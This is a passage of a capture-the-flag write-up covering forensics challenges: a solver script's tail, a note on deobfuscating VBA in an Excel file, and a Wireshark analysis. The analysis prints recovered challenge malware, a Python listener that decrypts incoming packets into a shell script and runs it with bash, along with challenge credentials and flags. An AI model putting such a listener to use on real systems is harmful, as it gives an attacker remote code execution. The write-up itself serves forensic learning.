+</span></span><span class="line"><span class="cl">    <span class="n">decoded_bytes</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">full_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">reversed_output</span> <span class="o">=</span> <span class="n">decoded_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s2">&#34;replace&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Decoded reversed command output:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">reversed_output</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Reverse the string locally to recover the original flag content</span>
+</span></span><span class="line"><span class="cl">    <span class="n">recovered_flag</span> <span class="o">=</span> <span class="n">reversed_output</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Recovered flag (after local reversal):&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">recovered_flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Failed to decode base64 output:&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+</span></span></code></pre></div><h2 id="legite---dfir">LEGITE - DFIR</h2>
+<h3 id="description-3">Description</h3>
+<p>All msoffice files are zipfiles.</p>
+<h3 id="explanation-3">Explanation</h3>
+<p>the excel file is a zip file which contains a vba binary, use a tool to convert it back to code, deobfuscate the code, understand it&hellip;to be fair I only took the ascii values, then the ascii values was a link to a obfuscated powershell code on github, deobfuscate again and you&rsquo;ll find the AES key and iv needed to decrypt the flag !</p>
+<h2 id="apt4444---dfir">APT4444 - DFIR</h2>
+<h3 id="description-4">Description</h3>
+<p>Simple Wireshark packet challenge</p>
+<h3 id="explanation-4">Explanation</h3>
+<p>To be fair I did a lot of guessing with this challenge, I used A-Packets to analyze the file and get the Attacker&rsquo;s IP (192.168.1.10, at first I thought it was 1.8), ffuf was also mentioned in strings and for the username and password one login request succeeded which had snickers-adminsn4ke as credentials, the hash part was tricky as I didn&rsquo;t know if I had to copy the content of one of the many files or export them via wireshark, there were 3 different exploit files so I tried all of them because I can&hellip;It was the silly reverse shell.</p>
+<p>How I obtained the reverse shell ? and the other files ? The power of Wireshark. a file has to be big so I sorted by length, then went through the rabbit hole of deobfuscation, and that led me to this stupid code :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">import socket
+</span></span><span class="line"><span class="cl">import os
+</span></span><span class="line"><span class="cl">from Crypto.Cipher import AES
+</span></span><span class="line"><span class="cl">from Crypto.Util.Padding import unpad
+</span></span><span class="line"><span class="cl">import hashlib
+</span></span><span class="line"><span class="cl">import subprocess
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">key = hashlib.sha256(b&#34;MCSC{sn4ky_as_usU4l}&#34;).digest()  
+</span></span><span class="line"><span class="cl">iv=b&#39;\xd8N^\xb7h_M\x8bF9\xebN!\xd4\xb2\x7f&#39;
+</span></span><span class="line"><span class="cl">def decrypt_data(data):
+</span></span><span class="line"><span class="cl">    cipher = AES.new(key, AES.MODE_CBC, iv)
+</span></span><span class="line"><span class="cl">    try:
+</span></span><span class="line"><span class="cl">        decrypted_data = unpad(cipher.decrypt(data), AES.block_size)
+</span></span><span class="line"><span class="cl">        return decrypted_data
+</span></span><span class="line"><span class="cl">    except ValueError:
+</span></span><span class="line"><span class="cl">        return None
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def listen_for_packets(host, port, output_file=&#34;malware.sh&#34;):
+</span></span><span class="line"><span class="cl">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span class="line"><span class="cl">    s.bind((host, port))
+</span></span><span class="line"><span class="cl">    s.listen(5)
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    while True:
+</span></span><span class="line"><span class="cl">        client_socket, addr = s.accept()
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        try:
+</span></span><span class="line"><span class="cl">            while True:
+</span></span><span class="line"><span class="cl">                packet = client_socket.recv(1024)
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                if not packet:
+</span></span><span class="line"><span class="cl">                    break 
+</span></span><span class="line"><span class="cl">                if packet.startswith(b&#39;McSc&#39;):
+</span></span><span class="line"><span class="cl">                    decrypted_data = decrypt_data(packet[4:])  
+</span></span><span class="line"><span class="cl">                    
+</span></span><span class="line"><span class="cl">                    if decrypted_data:
+</span></span><span class="line"><span class="cl">                        with open(output_file, &#34;ab&#34;) as f:
+</span></span><span class="line"><span class="cl">                            f.write(decrypted_data)
+</span></span><span class="line"><span class="cl">                    else:
+</span></span><span class="line"><span class="cl">                        print(&#34;&#34;)
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">        except Exception as e:
+</span></span><span class="line"><span class="cl">            print(f&#34;Error receiving or processing packet: {e}&#34;)
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        finally:
+</span></span><span class="line"><span class="cl">            subprocess.call([&#34;chmod&#34;,&#34;+x&#34;,&#34;malware.sh&#34;])
+</span></span><span class="line"><span class="cl">            subprocess.call([&#34;bash&#34;,&#34;malware.sh&#34;])
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">            client_socket.close()
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">if __name__ == &#34;__main__&#34;:
+</span></span><span class="line"><span class="cl">    listen_for_packets(&#34;192.168.1.8&#34;, 12345)  
+</span></span></code></pre></div><p>No the port isn&rsquo;t 12345, there is more&hellip;I looked for anything that mentions McSc and I finally found the malware file + the port.</p>
+<p>then I kept inputting MCSC{192.168.1.10_ffuf_snickers-adminsn4ke_0ef8adc6c6aa8ed49dfee752d4d058ac_8899_sn4ky_as_usU4l} and that wasn&rsquo;t the right flag, all because I thought the next packets had the attacker cat passwd, which we all know is hashed&hellip;that&rsquo;s where the last part of the flag is</p>
+<img src="data:image/png;base64,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